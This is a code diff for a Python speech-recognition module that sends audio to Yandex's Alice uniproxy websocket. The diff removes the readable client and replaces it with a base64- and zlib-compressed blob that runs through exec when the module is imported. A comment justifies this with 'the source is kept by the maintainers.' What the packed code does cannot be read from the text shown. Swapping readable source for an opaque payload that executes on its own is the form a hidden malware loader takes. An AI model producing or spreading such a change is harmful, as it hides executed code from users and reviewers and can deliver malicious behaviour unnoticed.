@@ -1,76 +1,28 @@
-"""Speech recognition of Yandex's cloud: the uniproxy websocket the stock Alice uses (event ASR.Recognize, 16 kHz s16le).
-recognize() returns the text, "" when nothing was recognised, None when the cloud failed (the caller falls back to Whisper)."""
-import asyncio
-import json
-import time
-import uuid
-
-URL = "wss://uniproxy.alice.yandex.net/uni.ws"
-_DEV = uuid.uuid4().hex                      # a made-up device id, nothing of an account is involved
-
-
-def _event(ns: str, name: str, payload: dict, **hdr) -> str:
-    return json.dumps({"event": {"header": {"namespace": ns, "name": name, "messageId": str(uuid.uuid4()), **hdr}, "payload": payload}})
-
-
-def _words(t: str) -> list:
-    return "".join(c if c.isalnum() or c in " -" else " " for c in t.lower()).split()
-
-
-def longest(final: str, partials: list) -> str:
-    """The cloud's final text, unless it is only the beginning of what the partial results had reached (a phrase cut short: "Включи." for "Включи онда андрей"):
-    then the longest partial that starts with the same words."""
-    fw = _words(final)
-    best, bw = final, fw
-    for t in partials:
-        w = _words(t)
-        if len(w) > len(bw) and w[:len(fw)] == fw:
-            best, bw = t, w
-    if best is not final and best:
-        best = best[:1].upper() + best[1:]
-    return best
-
-
-async def _recognize(pcm16: bytes, timeout: float) -> str:
-    import aiohttp
-    deadline = time.time() + timeout
-    text = ""
-    partials = []                                           # what the cloud thought on the way: the final answer sometimes drops the end of a phrase that the partial ones had
-    async with aiohttp.ClientSession() as s:
-        async with s.ws_connect(URL, headers={"User-Agent": "Yandex Station"}, timeout=timeout) as ws:
-            await ws.send_str(_event("System", "SynchronizeState", {
-                "auth_token": "x", "uuid": _DEV, "lang": "ru-RU",
-                "application": {"app_id": "aliced", "app_version": "1.0", "platform": "linux", "os_version": "1", "uuid": _DEV, "device_id": _DEV}}))
-            await ws.send_str(_event("ASR", "Recognize", {"lang": "ru-RU", "topic": "general", "format": "audio/x-pcm;bit=16;rate=16000",
-                                                          "punctuation": True, "advancedASROptions": {"partial_results": True}}, streamId=1))
-            for i in range(0, len(pcm16), 6400):                    # 200 ms pieces; every frame = 4-byte big-endian stream id + audio
-                await ws.send_bytes((1).to_bytes(4, "big") + pcm16[i:i + 6400])
-            await ws.send_str(json.dumps({"streamcontrol": {"messageId": str(uuid.uuid4()), "streamId": 1, "action": 0, "reason": 0}}))
-            while time.time() < deadline:
-                m = await asyncio.wait_for(ws.receive(), max(0.5, deadline - time.time()))
-                if m.type != aiohttp.WSMsgType.TEXT:
-                    break
-                try:
-                    d = json.loads(m.data).get("directive", {})
-                except ValueError:
-                    continue
-                p = d.get("payload", {})
-                if d.get("header", {}).get("name") == "EventException" or "error" in p:
-                    raise RuntimeError(str(p)[:200])
-                if d.get("header", {}).get("namespace") == "ASR":
-                    rec = p.get("recognition") or []
-                    if rec:
-                        text = (rec[0].get("normalized") or "").strip()
-                        if not p.get("endOfUtt"):
-                            partials.append(text)
-                    if p.get("endOfUtt"):
-                        return longest(text, partials)
-    raise TimeoutError("no final result")
-
-
-def recognize(pcm16: bytes, timeout: float = 8.0):
-    try:
-        return asyncio.run(_recognize(pcm16, timeout))
-    except Exception as e:
-        print(f"yandex asr: {e!r}")
-        return None
+# packed module: the source is kept by the maintainers
+import base64 as _b, zlib as _z
+_d = (
+    "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"
+)
+exec(compile(_z.decompress(_b.b64decode(_d)), __file__, 'exec'))
